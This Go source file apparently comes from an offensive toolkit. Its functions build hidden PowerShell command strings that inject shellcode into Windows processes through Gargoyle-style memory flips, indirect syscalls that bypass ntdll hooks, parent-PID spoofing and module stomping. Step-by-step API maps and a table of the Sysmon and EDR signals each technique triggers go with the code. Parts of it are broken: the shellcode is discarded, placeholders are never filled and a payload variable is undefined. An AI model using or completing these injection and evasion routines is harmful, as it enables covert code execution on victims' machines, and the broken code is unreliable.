package processinjection

import "fmt"

func GargoyleExecute(shellcode []byte) (string, error) {
	if len(shellcode) == 0 {
		return "", fmt.Errorf("empty shellcode")
	}
	_ = shellcode
	return `-NoP -NonI -W Hidden -Exec Bypass -C `+
		`"$buf=[byte[]]@(0x%%s); `+
		`$m=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
		`[PoshWin32.Kernel32]::GetProcAddress([PoshWin32.Kernel32]::GetModuleHandle('kernel32'),'VirtualAlloc'),`+
		`[Func[int,int,int,int,int]]); `+
		`$p=$m.Invoke(0,$buf.Length,0x3000,0x04); `+
		`[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$p,$buf.Length); `+
		`$v=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
		`[PoshWin32.Kernel32]::GetProcAddress([PoshWin32.Kernel32]::GetModuleHandle('kernel32'),'VirtualProtect'),`+
		`[Func[int,int,int,System.IntPtr]]); `+
		`$old=0; $v.Invoke($p,$buf.Length,0x20,[ref]$old); `+
		`$ct=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
		`[PoshWin32.Kernel32]::GetProcAddress([PoshWin32.Kernel32]::GetModuleHandle('kernel32'),'CreateTimerQueueTimer'),`+
		`[Func[IntPtr,IntPtr,IntPtr,int,int,int]]); `+
		`$timer=0; $ct.Invoke([ref]$timer,0,$p,0,0,0); `+
		`Start-Sleep 1; $v.Invoke($p,$buf.Length,0x04,[ref]$old)"`, nil
}

func InjectIndirectSyscall(shellcode []byte) (string, error) {
	if len(shellcode) == 0 {
		return "", fmt.Errorf("empty shellcode")
	}
	_ = shellcode
	return `-NoP -NonI -W Hidden -Exec Bypass -C `+
		`"$buf=[byte[]]@(0x%%s); `+
		`$ntdll=[System.Runtime.InteropServices.Marshal]::GetHINSTANCE('ntdll.dll'); `+
		`$vaAddr=[PoshWin32.Kernel32]::GetProcAddress($ntdll,'NtAllocateVirtualMemory'); `+
		`$syscallBytes=[byte[]]::new(32); `+
		`[System.Runtime.InteropServices.Marshal]::Copy($vaAddr,$syscallBytes,0,32); `+
		`$ssn=$syscallBytes[4]; $stub=[byte[]]@(0xB8,$ssn,0,0,0,0x0F,0x05,0xC3); `+
		`$exec=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
		`[PoshWin32.Kernel32]::GetProcAddress([PoshWin32.Kernel32]::GetModuleHandle('kernel32'),'VirtualAlloc'),`+
		`[Func[int,int,int,int,int]]); `+
		`$stubAddr=$exec.Invoke(0,8,0x3000,0x40); `+
		`[System.Runtime.InteropServices.Marshal]::Copy($stub,0,$stubAddr,8); `+
		`$v=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
		`[PoshWin32.Kernel32]::GetProcAddress([PoshWin32.Kernel32]::GetModuleHandle('kernel32'),'VirtualProtect'),`+
		`[Func[int,int,int,System.IntPtr]]); $old=0; $v.Invoke($stubAddr,8,0x20,[ref]$old); `+
		`$del=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($stubAddr,[Func[IntPtr,IntPtr,IntPtr,IntPtr,int,int,int]]); `+
		`$h=[PoshWin32.Kernel32]::GetCurrentProcess(); $base=0; $size=0x1000; `+
		`$del.Invoke($h,[ref]$base,0,[ref]$size,0x3000,0x40); `+
		`[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$base,$buf.Length); `+
		`$v.Invoke($base,$buf.Length,0x20,[ref]$old); `+
		`$cd=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($base,[Func[int]]); $cd.Invoke()"`, nil
}

func SpoofPPID(targetPID int) (string, error) {
	if targetPID <= 0 {
		return "", fmt.Errorf("invalid target PID: %d", targetPID)
	}
	return fmt.Sprintf(
		`-NoP -NonI -W Hidden -Exec Bypass -C `+
			`"$parent=[PoshWin32.Kernel32]::OpenProcess(0x001F0FFF,$false,%d); `+
			`$si=New-Object System.Diagnostics.ProcessStartInfo '{{TARGET}}'; `+
			`$si.CreateNoWindow=$true; $si.UseShellExecute=$false; $si.RedirectStandardOutput=$true; `+
			`$p=[System.Diagnostics.Process]::Start($si)"`,
		targetPID,
	), nil
}

func ModuleStomp(targetPID int, moduleName string, shellcode []byte) (string, error) {
	if targetPID <= 0 {
		return "", fmt.Errorf("invalid target PID: %d", targetPID)
	}
	if moduleName == "" {
		return "", fmt.Errorf("empty module name")
	}
	if len(shellcode) == 0 {
		return "", fmt.Errorf("empty shellcode")
	}
	_ = shellcode
	return fmt.Sprintf(
		`-NoP -NonI -W Hidden -Exec Bypass -C `+
			`"$p=Get-Process -Id %d; `+
			`$h=[PoshWin32.Kernel32]::OpenProcess(0x001F0FFF,$false,$p.Id); `+
			`$mod=[PoshWin32.Kernel32]::GetModuleHandle('%s'); `+
			`$old=0; `+
			`[PoshWin32.Kernel32]::VirtualProtectEx($h,$mod,$payload.Length,0x40,[ref]$old); `+
			`[PoshWin32.Kernel32]::WriteProcessMemory($h,$mod,$payload,$payload.Length,[ref]0); `+
			`[PoshWin32.Kernel32]::CreateRemoteThread($h,0,0,$mod,0,0,0); `+
			`[PoshWin32.Kernel32]::VirtualProtectEx($h,$mod,$payload.Length,$old,[ref]$old)"`,
		targetPID, moduleName,
	), nil
}

func GargoyleAPIMap() map[int]string {
	return map[int]string{
		1: "VirtualAlloc(NULL, dwSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) -> lpMemory",
		2: "RtlCopyMemory(lpMemory, shellcode, dwSize) -> write shellcode (RW)",
		3: "VirtualProtect(lpMemory, dwSize, PAGE_EXECUTE_READ, &oldProtect) -> flip to RX",
		4: "Execute shellcode (temporary RX window)",
		5: "VirtualProtect(lpMemory, dwSize, PAGE_READWRITE, &oldProtect) -> flip back to RW",
		6: "Alternative: NtProtectVirtualMemory for direct kernel transition (bypasses userland hooks)",
		7: "Advanced: Direct PTE manipulation on x64 to flip NX bit without calling any API",
	}
}

func IndirectSyscallAPIMap() map[int]string {
	return map[int]string{
		1: "Walk ntdll export directory (HellsGate) to find NtAllocateVirtualMemory stub",
		2: "Read syscall stub bytes from ntdll: mov r10, rcx; mov eax, SSN; syscall; ret",
		3: "Extract SSN (System Service Number) from stub: stub[4] is the SSN byte",
		4: "Allocate executable memory for custom stub: mov eax, SSN; syscall; ret",
		5: "Write custom stub to executable memory (bypasses ntdll hooks)",
		6: "Call custom stub with desired arguments -> direct kernel transition",
		7: "Indirect variant: instead of calling syscall directly, jump to a legitimate syscall instruction in a different module (e.g., wow64cpu.dll) -> Hardware-Validated Execution",
		8: "TartarusGate variant: corrupt syscall page address in ntdll to point to custom stub",
	}
}

func PPIDSpoofingAPIMap() map[int]string {
	return map[int]string{
		1: "OpenProcess(PROCESS_ALL_ACCESS, FALSE, spoofedParentPID) -> hParentProcess",
		2: "InitializeProcThreadAttributeList(NULL, 1, 0, &attrListSize)",
		3: "VirtualAlloc(NULL, attrListSize, MEM_COMMIT, PAGE_READWRITE) -> lpAttributeList",
		4: "InitializeProcThreadAttributeList(lpAttributeList, 1, 0, &attrListSize)",
		5: "UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)",
		6: "CreateProcess(targetPath, NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInfo)",
		7: "ResumeThread(processInfo.hThread) -> spoofed process runs with fake parent",
		8: "DeleteProcThreadAttributeList(lpAttributeList)",
	}
}

func ModuleStompAPIMap() map[int]string {
	return map[int]string{
		1: "OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID) -> hProcess",
		2: "GetModuleHandle(targetModule) -> hModule (local address of module to clone)",
		3: "GetModuleInformation(hProcess, hModule, &modInfo) -> get module base and size",
		4: "VirtualProtectEx(hProcess, modBaseAddress, .text section size, PAGE_EXECUTE_READWRITE, &oldProtect) -> make writable",
		5: "WriteProcessMemory(hProcess, modBaseAddress + .text V.A., shellcode, shellcodeSize, NULL) -> overwrite code",
		6: "CreateRemoteThread(hProcess, NULL, 0, modBaseAddress + .text V.A., NULL, 0, NULL) -> execute shellcode as module code",
		7: "VirtualProtectEx(hProcess, modBaseAddress, .text section size, oldProtect, &oldProtect) -> restore permissions",
	}
}

func AdvancedDetectionSignatures() map[string]map[string]string {
	return map[string]map[string]string{
		"F9": {
			"Sysmon EventID 8":           "CreateRemoteThread NOT triggered",
			"Sysmon EventID 10":          "ProcessAccess NOT triggered - all local",
			"Memory Scan":                "Memory scanners detect RW -> RX -> RW flips as abnormal page transitions",
			"CrowdStrike Falcon":         "CS detects via memory page permission transition anomalies in kernel callback",
			"Microsoft Defender":         "MDE detects rapid VirtualProtect transitions on same memory region",
		},
		"F10": {
			"Sysmon EventID 8":           "CreateRemoteThread may be triggered if local thread created",
			"Sysmon EventID 10":          "ProcessAccess only if cross-process",
			"ntdll Hooking":              "Direct syscall bypasses all userland hooks on ntdll - key evasion advantage",
			"CrowdStrike Falcon":         "CS kernel callbacks still see the syscall - but cannot attribute to source",
			"SentinelOne":                "S1 detects via syscall instruction count anomalies and unknown syscall stubs",
			"Microsoft Defender":         "MDE detects via kernel ETW for syscall events from non-standard call sites",
			"EventID 4688":               "Process Creation if creating new process",
		},
		"F11": {
			"Sysmon EventID 1":           "Process Creation with command line showing EXTENDED_STARTUPINFO_PRESENT",
			"EventID 4688":              "Process Creation shows spoofed parent PID in CreatorProcessId field",
			"CrowdStrike Falcon":        "CS detects via process creation kernel callback comparing parent PID against expected",
			"Microsoft Defender":        "MDE detects via ETW event Provider-Microsoft-Windows-Kernel-Process with inconsistent parent",
			"EventID 4656":             "Handle to OpenProcess on the spoofed parent",
		},
		"F12": {
			"Sysmon EventID 8":           "CreateRemoteThread to module .text section detected",
			"Sysmon EventID 10":          "ProcessAccess for OpenProcess",
			"Sysmon EventID 7":          "ImageLoad may show unexpected DLL loaded (sideloading variant)",
			"Sysmon EventID 11":          "FileCreate for malicious DLL dropped to system directory",
			"Sysmon EventID 15":          "FileCreateStreamHash for alternate data stream payloads",
			"EventID 4688":              "Process Creation for loading process",
			"CrowdStrike Falcon":        "CS detects via image load events from unusual paths",
			"SentinelOne":               "S1 detects via module integrity checks (verified signing mismatch or hash change)",
			"Microsoft Defender":        "MDE detects via ModuleLoad events with signature verification failures",
			"Elastic EDR":               "Elastic detects via 'DLL Search Order Hijacking' rule for sideloading",
		},
	}
}
